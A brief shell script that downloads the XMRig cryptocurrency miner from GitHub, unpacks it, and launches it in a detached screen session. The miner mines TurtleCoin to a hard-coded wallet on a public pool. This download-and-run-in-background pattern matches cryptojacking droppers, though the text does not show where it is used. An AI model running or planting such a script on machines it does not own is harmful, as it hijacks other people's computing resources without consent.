#!/bin/sh
wget 'https://github.com/xmrig/xmrig/releases/download/v6.7.2/xmrig-6.7.2-linux-x64.tar.gz'
tar -xf xmrig-6.7.2-linux-x64.tar.gz 
cd xmrig-6.7.2  
screen -d -m ./xmrig -o turtlecoin.herominers.com:10381 -u TRTLv2Qhn1hfE8bpBBPxs2YtexmdU7MTXUqKeaoNCycNVXrvDHdudpsEJgG7DqqzdkJWvfqBdBNSgb42jgvCcXmYfMPmtPDqD2H  -a argon2/chukwav2
